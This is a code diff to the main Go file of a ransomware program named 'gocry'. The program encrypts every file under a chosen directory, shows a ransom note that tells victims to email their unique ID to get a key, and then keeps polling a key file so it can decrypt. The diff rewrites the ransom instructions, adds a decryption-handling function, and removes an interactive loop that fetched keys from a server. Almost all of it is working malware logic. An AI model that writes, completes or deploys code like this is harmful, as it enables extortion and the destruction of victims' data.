@@ -1,8 +1,6 @@
 package main
 
 import (
-	"bufio"
-	"io/ioutil"
 	"log"
 	"os"
 	"strings"
@@ -22,11 +20,33 @@ Hello, you've been infected by gocry. Your files have been encrypted using milit
 Do not use any decryption software or change the files, otherwise they might be lost forever.
 
 How to decrypt:
-1. Type 'decrypt' into the command-line such that 
-2. Done.
+1. Send email to example@example.com containing your unique ID, then you'll  receive a key.
+2. Place the correct key into a file called key.txt in the root directory.
+3. After this all your files will be decrypted.
+
+Your unique ID is: %s
 `
 
 const serverPath = "http://localhost:8080"
+
+func handleDecryptionProcess(rw *ransomware.Ransomware) {
+	if rw.CheckIfValidMemSafeKey() {
+		fmt.Println("found a valid key.")
+
+		// remove the generated files
+		rw.RemoveRansomFile()
+		rw.RemoveKeyFile()
+
+		if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
+			log.Fatalf("error decrypting all files: %s", err)
+		}
+
+		fmt.Println("Thank you for your cooperation!")
+	}
+
+	fmt.Println("key is not valid, try again.")
+	os.Exit(0)
+}
 
 func main() {
 	// safely terminate in case of an interrupt signal
@@ -37,12 +57,15 @@ func main() {
 	if strings.HasSuffix(rootToEncrypt, "/") {
 		rootToEncrypt = rootToEncrypt[:len(rootToEncrypt)-1]
 	}
-
 	config.CreateConfiguration(serverPath, rootToEncrypt, message)
 
 	rw, err := ransomware.NewRansomware()
 	if err != nil {
 		log.Fatalf("error creating a ransomware instance: %s", err)
+	}
+
+	if err := rw.CheckIfActiveRansom(); err != nil {
+		handleDecryptionProcess(rw)
 	}
 
 	crypt.EncryptRoot(rw.RootDir, rw.MemguardKey)
@@ -62,68 +85,26 @@ func main() {
 
 	// Start an infnite loop which checks key validity. We start in a goroutine, since
 	// we want the user to be able to interact with the ransomware.
-	go func() {
-		for {
-			fmt.Println()
-			fmt.Println("Checking key file...")
-
-			if ok := rw.CheckIfValidMemSafeKey(); ok {
-				// remove the generated files
-				rw.RemoveRansomFile()
-				rw.RemoveKeyFile()
-
-				if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
-					log.Fatalf("error decrypting all files: %s", err)
-				}
-
-				fmt.Println("Thank you for your cooperation!")
-
-				// Stop the whole program
-				os.Exit(0)
-			}
-
-			fmt.Println("Key did not match, checking again in 1 minute(s)...")
-			time.Sleep(time.Second * 20)
-		}
-	}()
-
-	fmt.Println("You can find commands to interact with gocry by typing: commands")
-
-	reader := bufio.NewReader(os.Stdin)
 	for {
-		text, err := reader.ReadString('\n')
-		if err != nil {
-			fmt.Println("error reading your command, please try again!")
-			continue
+		fmt.Println()
+		fmt.Println("Checking key file...")
+
+		if ok := rw.CheckIfValidMemSafeKey(); ok {
+			// remove the generated files
+			rw.RemoveRansomFile()
+			rw.RemoveKeyFile()
+
+			if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
+				log.Fatalf("error decrypting all files: %s", err)
+			}
+
+			fmt.Println("Thank you for your cooperation!")
+
+			// Stop the whole program
+			os.Exit(0)
 		}
-		text = strings.Replace(text, "\n", "", -1)
-		if text == "commands" {
-			fmt.Println("'commands' - displays all of the commands available.")
-			fmt.Println("'uuid' - display your unique indentifer used to pay your ransomware.")
-			fmt.Println("'decrypt' - decrypts all the encrypted files only if the key.txt containst the right key.")
-		} else if text == "uuid" {
-			fmt.Println(rw.Data.UUID)
-		} else if text == "decrypt" {
-			// send the key to the database and get the decrypted key using the private rsa key from the server.
-			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
-			if err != nil {
-				log.Fatalf("error reading key file: %s", err)
-			}
 
-			decryptedKey, err := rw.Data.GetKeyFromServer(key)
-			if err != nil {
-				fmt.Println("error decrypting key from server...")
-				continue
-			}
-
-			if err := rw.RemoveKeyFile(); err != nil {
-				fmt.Println("error removing old key file...")
-				continue
-			}
-
-			if err := ioutil.WriteFile(rw.RootDir+"/key.txt", decryptedKey, 0600); err != nil {
-				log.Fatalf("write output: %s", err)
-			}
-		}
+		fmt.Println("Key did not match, checking again in 1 minute(s)...")
+		time.Sleep(time.Second * 20)
 	}
 }
